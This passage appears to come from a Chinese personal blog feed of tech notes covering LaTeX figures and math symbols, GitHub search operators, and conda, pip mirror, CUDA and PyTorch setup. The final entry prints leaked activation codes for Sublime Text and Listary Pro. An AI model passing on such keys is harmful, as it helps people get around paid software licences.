<p><a href="https://blog.csdn.net/qq_35091353/article/details/111403178?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">(11条消息) Latex中插入图片_还能坚持的博客-CSDN博客_latex插入图片</a></p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure&#125;</span><br><span class="line">    <span class="keyword">\centering</span></span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[c]&#123;0.5<span class="keyword">\textwidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[height=4.5cm,width=7.5cm]&#123;original<span class="built_in">_</span>invert.jpg&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[c]&#123;0.5<span class="keyword">\textwidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[height=4.5cm,width=7.5cm]&#123;invert<span class="built_in">_</span>image.jpg&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\caption</span>&#123;并排图形&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202205011026064.png" alt="image-20220501102617993"></p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure&#125;[htbp]</span><br><span class="line">    <span class="keyword">\centering</span></span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.4<span class="keyword">\linewidth</span>&#125;  <span class="comment">%并排插图时，线宽很重要，自己慢慢试，俩张图就不要超过0.5，三张图不要超过0.33之类的，自己看着办  </span></span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[height=5cm]&#123;original<span class="built_in">_</span>invert.jpg&#125;</span><br><span class="line">        <span class="comment">% \label&#123;fig4&#125;</span></span><br><span class="line">        <span class="comment">% \caption&#123;原始图像&#125;</span></span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\hfill</span><span class="comment">%分栏的意思吧</span></span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.5<span class="keyword">\linewidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[height=5cm]&#123;invert<span class="built_in">_</span>image.jpg&#125;</span><br><span class="line">        <span class="comment">% \label&#123;fig5&#125;</span></span><br><span class="line">        <span class="comment">% \caption&#123;invert操作图像&#125;</span></span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\label</span>&#123;fig4&#125;</span><br><span class="line">    <span class="keyword">\caption</span>&#123;原始图像与invert操作图像&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-3-插入列表">2.3 插入列表</h2>
<p>[(11条消息) <a href="https://blog.csdn.net/xovee/article/details/106365532">翻译] LaTeX 中的列表_Xovee的博客-CSDN博客_latex 列表</a></p>
<p>列表缩进</p>
<p><a href="https://www.csdn.net/tags/NtzaYg3sMzg3ODQtYmxvZwO0O0OO0O0O.html">(11条消息) item调整缩进 latex - CSDN</a></p>
<p><a href="https://blog.csdn.net/JingpengSun/article/details/129166744">Latex 插入列举条目、编号item及间隔调整_latex列举_衷科知眠的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/robert_chen1988/article/details/83179571">https://blog.csdn.net/robert_chen1988/article/details/83179571</a></p>
<h2 id="2-4-插入表格">2.4 插入表格</h2>
<p><a href="https://zhuanlan.zhihu.com/p/392190222">LaTeX插入表格教程（心得分享） - 知乎 (zhihu.com)</a></p>
<h2 id="2-5-参考文献">2.5 参考文献</h2>
<p><a href="https://www.jianshu.com/p/bb0585d34e47">Latex插入参考文献的两种方式（以IEEE为例） - 简书 (jianshu.com)</a></p>
<p><a href="https://blog.csdn.net/qq_36235935/article/details/116938313">(11条消息) Latex中如何插入参考文献的两种方法_进击的程序媛阿飒的博客-CSDN博客_latex添加参考文献</a></p>
<p><a href="https://blog.csdn.net/qq_39540454/article/details/107604031">(11条消息) LATEX插入参考文献（两种方法）_feiba54的博客-CSDN博客_latex参考文献</a></p>
<h2 id="2-6-空格">2.6 空格</h2>
<p><a href="https://blog.csdn.net/gsgbgxp/article/details/129693747">LaTeX中的宽度单位em,ex,px,pt_latex pt-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hysterisis/article/details/114123131">Latex 中的空格汇总_latex 空白-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hysterisis/article/details/114123131">(78条消息) Latex 中的空格汇总_latex中空格_零度蛋花粥的博客-CSDN博客</a></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307261602226.jpeg" alt="img"></p>
<h1>3 数学公式</h1>
<h2 id="3-1-函数">3.1 函数</h2>
<p>对数 $log_ax$</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>log<span class="built_in">_</span>ax<span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span>lnx<span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span>lgx<span class="built_in">$</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>$log_ax$</p>
<p>$lnx$</p>
<p>$lgx$</p>
</blockquote>
<h2 id="3-2-符号表">3.2 符号表</h2>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="keyword">\alpha</span><span class="built_in">$</span></span><br><span class="line"><span class="keyword">\nabla</span></span><br><span class="line"><span class="keyword">\partial</span> </span><br><span class="line"><span class="keyword">\underline</span> a</span><br></pre></td></tr></table></figure>
<p>$\alpha$</p>
<p>$\nabla$</p>
<p>$\partial$</p>
<p>$\underline a$</p>
<p>空格表</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112292226115.png" alt="img"></p>
<p>希腊字母表</p>
<p><img src="D:%5CHexo%5Cimage%5C202112292214231.png" alt="img"></p>
<p>数学模式重音符号</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112292226278.png" alt="img"></p>
<p>二元关系</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112292227484.png" alt="img"></p>
<p>二元运算符</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112292227918.png" alt="img"></p>
<p>“大”运算符</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112292228849.png" alt="img"></p>
<p>箭头</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112292253282.png" alt="img"></p>
<p>定界符</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112292254595.png" alt="img"></p>
<p>空心字符<br>
$$<br>
\mathbb{R}<br>
$$</p>
<h2 id="3-3-上下标、根号、省略号">3.3 上下标、根号、省略号</h2>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">下标：</span><br><span class="line"><span class="built_in">$</span>x<span class="built_in">_</span>i<span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span>x<span class="built_in">_</span>&#123;i1&#125;<span class="built_in">$</span></span><br><span class="line"></span><br><span class="line">上标：</span><br><span class="line"><span class="built_in">$</span>x<span class="built_in">^</span>2<span class="built_in">$</span></span><br><span class="line"></span><br><span class="line">根号：</span><br><span class="line"><span class="built_in">$</span>5<span class="keyword">\sqrt</span>[n]&#123;3&#125;<span class="built_in">$</span></span><br><span class="line"></span><br><span class="line">省略号：</span><br><span class="line"><span class="built_in">$</span><span class="keyword">\dots</span><span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span><span class="keyword">\cdots</span><span class="built_in">$</span></span><br><span class="line"></span><br><span class="line">分式中上下标</span><br><span class="line"><span class="keyword">\frac</span>&#123;<span class="keyword">\sum</span><span class="built_in">_</span>1<span class="built_in">^</span>n&#125;&#123;n&#125;</span><br><span class="line"><span class="keyword">\frac</span>&#123;<span class="keyword">\sum</span><span class="keyword">\limits</span><span class="built_in">_</span>1<span class="built_in">^</span>n&#125;&#123;n&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-3">
<p>$x_i$</p>
</li>
</ul>
<blockquote>
<p>上下标多于一个字母时： $x_{i1}$</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>$x^2$</p>
</li>
<li class="lvl-2">
<p>$5\sqrt[n]{3}$</p>
</li>
<li class="lvl-3">
<p>$\dots$</p>
</li>
<li class="lvl-2">
<p>$\cdots$</p>
</li>
</ul>
<p>$$<br>
\frac{\sum_1^n}{n}\<br>
\frac{\sum\limits_1^n}{n}<br>
$$</p>
<h2 id="3-4-箭头">3.4 箭头</h2>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$leftarrow</span>$</span></span><br></pre></td></tr></table></figure>
<p>$\leftarrow$</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/20181104140310286.JPG" alt="img"></p>
<h2 id="3-5-除法">3.5 除法</h2>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">\frac</span><span class="template-variable">&#123;1&#125;</span><span class="template-variable">&#123;2&#125;</span></span><br></pre></td></tr></table></figure>
<p>$\frac{1}{2}$</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br><span class="line"> a \<span class="built_in">div</span> b\\</span><br><span class="line"> a \times b\\</span><br><span class="line"> a \cdot b</span><br><span class="line"> <span class="symbol">$</span><span class="symbol">$</span></span><br></pre></td></tr></table></figure>
<p>$$<br>
a \div b\<br>
a \times b\<br>
a \cdot b<br>
$$</p>
<h2 id="3-6-上下分层">3.6 上下分层</h2>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">a_</span><span class="template-variable">&#123;-&#125;</span><span class="language-xml">^</span><span class="template-variable">&#123;+&#125;</span></span><br></pre></td></tr></table></figure>
<p>$a_{-}^{+}$</p>
<h2 id="3-7-分段函数">3.7 分段函数</h2>
<figure class="highlight fsharp"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">begin</span>&#123;equation&#125;</span><br><span class="line">next[j]<span class="operator">=</span></span><br><span class="line"></span><br><span class="line">\<span class="keyword">begin</span>&#123;cases&#125;</span><br><span class="line"><span class="number">0</span><span class="operator">&amp;</span> \<span class="keyword">text</span>&#123;j<span class="operator">=</span><span class="number">1</span>&#125;\\</span><br><span class="line">max\&#123;k,<span class="number">1</span><span class="operator">&lt;</span>k<span class="operator">&lt;</span>j且<span class="symbol">&#x27;p_1</span><span class="operator">...</span>p_k<span class="string">&#x27;=&#x27;</span><span class="keyword">p_</span>&#123;j<span class="operator">-</span>k<span class="operator">+</span><span class="number">1</span>&#125;<span class="operator">...</span><span class="keyword">p_</span>&#123;j<span class="number">-1</span>&#125;&#x27;\&#125;<span class="operator">&amp;</span> \<span class="keyword">text</span>&#123;此集合不空时&#125;\\</span><br><span class="line"><span class="number">1</span><span class="operator">&amp;</span> \<span class="keyword">text</span>&#123;其他情况&#125;</span><br><span class="line"></span><br><span class="line">\<span class="keyword">end</span>&#123;cases&#125;</span><br><span class="line"></span><br><span class="line">\<span class="keyword">end</span>&#123;equation&#125;</span><br></pre></td></tr></table></figure>
<p>$$<br>
\begin{equation}<br>
next[j]=</p>
<p>\begin{cases}<br>
0&amp; \text{j=1}\<br>
max{k,1&lt;k&lt;j且’p_1…p_k’=‘p_{j-k+1}…p_{j-1}’}&amp; \text{此集合不空时}\<br>
1&amp; \text{其他情况}</p>
<p>\end{cases}</p>
<p>\end{equation}<br>
$$</p>
<h2 id="3-8-比较符号">3.8 比较符号</h2>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">leq</span>	</span><br><span class="line">\<span class="keyword">geq</span></span><br></pre></td></tr></table></figure>
<p>$\leq$</p>
<h2 id="3-9-导数">3.9 导数</h2>
<p>偏导符号</p>
<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line">\<span class="built_in">frac</span>&#123;\partial f&#125;&#123;\partial <span class="variable language_">x</span>&#125;</span><br><span class="line">\<span class="built_in">frac</span>&#123;\mathrm&#123;d&#125; f&#125;&#123;\mathrm&#123;d&#125; <span class="variable language_">y</span>&#125;</span><br><span class="line">\<span class="built_in">frac</span>&#123;<span class="variable language_">y</span>^&#123;<span class="string">&#x27;&#125;&#125;&#123;x^&#123;&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>$$<br>
\frac{\partial f}{\partial x} \<br>
\frac{\mathrm{d} f}{\mathrm{d} y}\<br>
\frac{y<sup>{'}}{x</sup>{'}}<br>
$$</p>
<p><strong>点形式的求导符号：\dot x 和 \ddot y</strong></p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">$ <span class="string">\frac&#123;</span> <span class="string">\dot</span> y &#125;&#123; <span class="string">\dot</span> x &#125; $  <span class="comment"># 一个点</span></span><br><span class="line">$ <span class="string">\frac&#123;</span> <span class="string">\ddot</span> y &#125;&#123; <span class="string">\ddot</span> x &#125; $  <span class="comment"># 两个点</span></span><br><span class="line">$ <span class="string">\frac&#123;</span> <span class="string">\dddot</span> y &#125;&#123; <span class="string">\dddot</span> x &#125; $  <span class="comment"># 几个点就是几个d</span></span><br></pre></td></tr></table></figure>
<p>$$<br>
\frac{ \dot y }{ \dot x } \<br>
\frac{ \ddot y }{ \ddot x } \<br>
\frac{ \dddot y }{ \dddot x }<br>
$$</p>
<p><strong>全微分算子：\nabla f</strong></p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="string">\nabla</span> f</span><br><span class="line"><span class="string">\Delta</span> f</span><br></pre></td></tr></table></figure>
<p>$$<br>
\nabla f<br>
$$</p>
<h2 id="3-10-矩阵">3.10 矩阵</h2>
<h2 id="3-11-向上取整-向下取整">3.11 向上取整/*向下取整***</h2>
<p><em>千次阅读</em></p>
<p>2020-03-11 17:00:58</p>
<p>个人博客：<a href="https://www.vectormoon.net/">https://www.vectormoon.net/</a></p>
<p>向上取整指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$\lceil x \rceil$</span><br></pre></td></tr></table></figure>
<p>向下取整指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$\lfloor x \rfloor$</span><br></pre></td></tr></table></figure>
<p>$$<br>
[\enspace\lceil \frac{k_w-1}{2}\rceil,<br>
\lfloor\frac{k_w-1}{2}\rfloor,<br>
\lceil \frac{k_h-1}{2}\rceil,<br>
\lfloor\frac{k_h-1}{2}\rfloor\enspace]<br>
$$</p>
<p>$$<br>
\gradient<br>
$$</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>Github搜索、浏览器高级搜索</title>
    <url>/2023/02/28/%E5%B7%A5%E5%85%B7/%E6%90%9C%E7%B4%A2-%E5%BF%AB%E6%8D%B7%E9%94%AE-%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1>1 一、搜索查找相关</h1>
<h2 id="1-1-Github搜索">1.1 Github搜索</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>在名字中搜索</p>
<blockquote>
<p>in:name spring boot</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>stars: &gt;</p>
<p>forks: &gt;</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>在详情(readme）搜索<br>
in: readme spring boot</p>
</li>
<li class="lvl-2">
<p>description<br>
in: description</p>
</li>
<li class="lvl-2">
<p>language: java</p>
</li>
<li class="lvl-2">
<p>pushed: &gt;2021-03-04</p>
</li>
</ul>
<h2 id="1-2-浏览器高级搜索">1.2 浏览器高级搜索</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>site限制搜索的网站<br>
<a href="http://pan.baidu.com">http://pan.baidu.com</a></p>
</li>
<li class="lvl-2">
<p>filetype限制搜索的类型</p>
</li>
<li class="lvl-2">
<p>intitle</p>
</li>
<li class="lvl-2">
<p>intext</p>
</li>
</ul>
<h1>2 快捷键</h1>
<h2 id="2-1-vscode">2.1 vscode</h2>
<blockquote>
<p>ctrl+k, ctrl 0折叠所有函数</p>
<p>ctrl+k, ctrl+n</p>
<p>ctrl+k, ctrl+j 展开所有函数</p>
</blockquote>
<p>注释</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202201161646898.png" alt="image-20220116164638779"></p>
<h1>3 三、命令</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>ipconfig	查看ip地址</p>
</li>
<li class="lvl-2">
<p>powercfg batteryreport       查看电脑电池信息</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2024/06/05/%E6%A1%86%E6%9E%B6/%E6%89%8B%E6%92%95%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>【题目1】生产者消费者 <br>
【题目2】实现BASE256编码 <br>
【题目3】实现数字的16、8进制输出，10位长度，不足补0</p>
<p>【题目4】一对兔子，3个月后每个月产出一对兔子，n个月之后的兔子数量<br>
$f(n)=f(n-1)+f(n-2)$</p>
<p>有一个文件，文件内容是E-Mail地址，已知文件大小约2GB，每行一个E-Mail地址， 但有部分E-Mail地址是重复的，现在有一台VM，VM内存为1GB，业务需要向这些 E-Mail发送邮件，但不能重复发，所以需要写一个程序对E-Mail地址进行去重。</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/02/28/%E5%B7%A5%E5%85%B7/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-%E6%BF%80%E6%B4%BB%E7%A0%81/</url>
    <content><![CDATA[<h1>1 软件安装、环境配置</h1>
<h2 id="1-1-一、Anconda">1.1 一、Anconda</h2>
<p>Anaconda国内镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">Index of /anaconda/archive/ | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112061925447.png" alt="image-20211206192535260"></p>
<p>设置环境路径</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112061931956.png" alt="image-20211206193116787"></p>
<h3 id="1-1-1-jupyter-notebook">1.1.1 jupyter notebook</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>起始位置</p>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111252259406.png" alt="image-20211125225924316" style="zoom: 33%;" />
</li>
</ul>
<p>[安装pytorch对应版本](<a href="https://pytorch.org/get-started/locally/">Start Locally | PyTorch</a>)</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112061919137.png" alt="image-20211206191931040"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>目录</p>
<p><a href="https://blog.csdn.net/pursuit__/article/details/106196202">(9条消息) 如何在jupyter notebook中显示目录？_pursuit__的博客-CSDN博客_jupyter显示目录</a></p>
</li>
</ul>
<h3 id="1-1-2-配置国内镜像">1.1.2 配置国内镜像</h3>
<p><a href="https://blog.csdn.net/anglemanyi/article/details/112647242">Anaconda配置国内镜像源</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>为conda配置（清华）镜像源</p>
<p>1 添加镜像（永久）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs<span class="regexp">/free/</span></span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs<span class="regexp">/main/</span></span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud<span class="regexp">/conda-forge/</span></span><br><span class="line"><span class="comment">#设置搜索时显示通道地址</span></span><br><span class="line">conda config --set show_channel_urls yes</span><br></pre></td></tr></table></figure>
<p>2 显示添加的源</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">conda <span class="built_in">config</span> <span class="comment">--show channels</span></span><br></pre></td></tr></table></figure>
<p>3 删除指定的源</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">conda<span class="built_in"> config </span>--<span class="built_in">remove</span> channels 源名称或链接 </span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>pip配置国内镜像源</p>
<p>临时修改</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">pip install numpy -i https:<span class="comment">//mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 清华源</span></span><br><span class="line">pip config <span class="keyword">set</span> <span class="keyword">global</span>.index-url https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 或：</span></span><br><span class="line"><span class="meta"># 阿里源</span></span><br><span class="line">pip config <span class="keyword">set</span> <span class="keyword">global</span>.index-url https:<span class="comment">//mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"><span class="meta"># 腾讯源</span></span><br><span class="line">pip config <span class="keyword">set</span> <span class="keyword">global</span>.index-url http:<span class="comment">//mirrors.cloud.tencent.com/pypi/simple</span></span><br><span class="line"><span class="meta"># 豆瓣源</span></span><br><span class="line">pip config <span class="keyword">set</span> <span class="keyword">global</span>.index-url http:<span class="comment">//pypi.douban.com/simple/</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>​		国内常用源镜像地址：</p>
<p>​			清华：<a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
<p>​			阿里云：<a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p>
<p>​			中国科技大学: <a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a></p>
<p>​			华中理工大学：<a href="https://pypi.hustunique.com/">https://pypi.hustunique.com/</a></p>
<p>​			山东理工大学：<a href="https://pypi.sdutlinux.org/">https://pypi.sdutlinux.org/</a></p>
<p>​			豆瓣：<a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></p>
<p><a href="https://www.zhihu.com/zvideo/1363284223420436480">Windows下安装CUDA和Pytorch跑深度学习 - 知乎 (zhihu.com)</a></p>
<p>[(6条消息) 多种方法彻底解决pycharm中: OSError: <a href="https://blog.csdn.net/weixin_43959833/article/details/116669523?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">WinError 1455] 页面文件太小，无法完成操作 的问题_孤柒的博客-CSDN博客_python页面文件太小,无法完成操作</a></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112062154214.png" alt="image-20211206215434078"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112062209316.png" alt="image-20211206220952148"></p>
<h3 id="1-1-3-conda环境管理">1.1.3 conda环境管理</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>查看环境</p>
</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">conda <span class="built_in">info</span> --envs</span><br><span class="line">conda env list  查看环境</span><br><span class="line">conda create --name python27 <span class="attribute">python</span>=2.7  创建环境，指定python版本</span><br><span class="line">conda activate python27  激活环境</span><br><span class="line">conda deactivate</span><br><span class="line">conda install <span class="attribute">python</span>=3.8 更新环境版本</span><br></pre></td></tr></table></figure>
<p>删除环境python27</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">conda remove</span> <span class="literal">--</span><span class="comment">name python27</span> <span class="literal">--</span><span class="comment">all</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>切换环境</p>
</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">conda <span class="keyword">install</span> nb_conda </span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112062231739.png" alt="image-20211206223133559"></p>
<p>问题</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>进入<code>..\Anaconda3\pkgs\nb_conda-2.2.0-py36_0\Lib\site-packages\nb_conda</code>(<strong>py36.0</strong>根据版本可能会有不同)</p>
</li>
<li class="lvl-2">
<p>打开envmanager.py文件</p>
</li>
</ul>
<p><a href="https://blog.csdn.net/what_how_why2020/article/details/116290592">(6条消息) 解决问题：EnvironmentLocationNotFound: Not a conda environment: /anaconda3/envs/anaconda3_what_how_why2020的博客-CSDN博客</a></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112062232815.png" alt="image-20211206223222635"></p>
<p>在新建的环境中安装jupyter</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">conda <span class="keyword">install</span> ipykernel</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/weixin_39631767/article/details/110423082">(6条消息) anaconda新建环境_Jupyter Notebook中切换conda虚拟环境_weixin_39631767的博客-CSDN博客</a></p>
<h1>2 Edge</h1>
<p><a href="https://www.bilibili.com/read/cv12675669">更改Microsoft Edge浏览器的缓存位置、用户数据目录位置 - 哔哩哔哩 (bilibili.com)</a></p>
<h2 id="2-1-nvidia-smi">2.1 nvidia-smi</h2>
<p><a href="https://www.cnblogs.com/wsnan/p/11769838.html">nvidia-smi 系列命令，查看gpu ，显存信息</a></p>
<p>cuda版本：nvcc --version</p>
<p>实时刷新</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">nvidia-<span class="keyword">smi</span> -l x或者nvidia-<span class="keyword">smi</span> --<span class="keyword">loop</span>=xxx</span><br></pre></td></tr></table></figure>
<h2 id="2-2-detectron2">2.2 detectron2</h2>
<p><a href="https://blog.csdn.net/weixin_42644340/article/details/109178660?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.nonecase">(9条消息) Windows10下安装detectron2超详细教程（小白视角）_小白wwj的博客-CSDN博客_detectron2 windows安装</a></p>
<p><a href="https://gitanswer.com/detectron2-nvcc-exe-failed-with-exit-status-1-problem-installing-detectron2-on-windows-10-python-638604938">https://gitanswer.com/detectron2-nvcc-exe-failed-with-exit-status-1-problem-installing-detectron2-on-windows-10-python-638604938</a></p>
<h1>3 cuda</h1>
<p>检验cuda和pytorch是否兼容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(torch.__version__)</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>4 软件历史版本</h1>
<h2 id="4-1-Nvidia">4.1 Nvidia</h2>
<p><a href="https://developer.nvidia.cn/cuda-toolkit-archive">CUDA Toolkit Archive | NVIDIA Developer</a></p>
<h2 id="4-2-Visual-Studio">4.2 Visual Studio</h2>
<p><a href="https://visualstudio.microsoft.com/zh-hans/">Visual Studio</a></p>
<h2 id="4-3-python">4.3 python</h2>
<p><a href="https://www.python.org/ftp/python/">Index of /ftp/python/</a></p>
<h1>5 sublime text激活码</h1>
<blockquote>
<p>----- BEGIN LICENSE -----<br>
Member J2TeaM<br>
Single User License<br>
EA7E-1011316<br>
D7DA350E 1B8B0760 972F8B60 F3E64036<br>
B9B4E234 F356F38F 0AD1E3B7 0E9C5FAD<br>
FA0A2ABE 25F65BD8 D51458E5 3923CE80<br>
87428428 79079A01 AA69F319 A1AF29A4<br>
A684C2DC 0B1583D4 19CBD290 217618CD<br>
5653E0A0 BACE3948 BB2EE45E 422D2C87<br>
DD9AF44B 99C49590 D2DBDEE1 75860FD2<br>
8C8BB2AD B2ECE5A4 EFC08AF2 25A9B864<br>
------ END LICENSE ------</p>
</blockquote>
<h1>6 Listary Pro 激活码</h1>
<p>名称：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mike Rountree</span><br></pre></td></tr></table></figure>
<p>Email：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">soft@instant-demo.com</span><br></pre></td></tr></table></figure>
<p>激活码：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">JE4V8T3M96PWT4SUCNZNVZ37XKLBU2QW</span><br><span class="line">N64LEJQ3VHY7MPL6KY2R5SQZ76QFFTKP</span><br><span class="line">VVE8JBVEAME8MMBRHRGF2P6MAJG7ZSQY</span><br><span class="line">MUY2PGTO2EG3W2YHTU2CFWL7SE6THU3Q</span><br><span class="line">TAL3U894S2BWA9629EFCXYYYG3S65WEQ</span><br><span class="line">5R234G26AT52UWD27PNENP4GR2EKKDK6</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>MySQL(1)：存储引擎、索引</title>
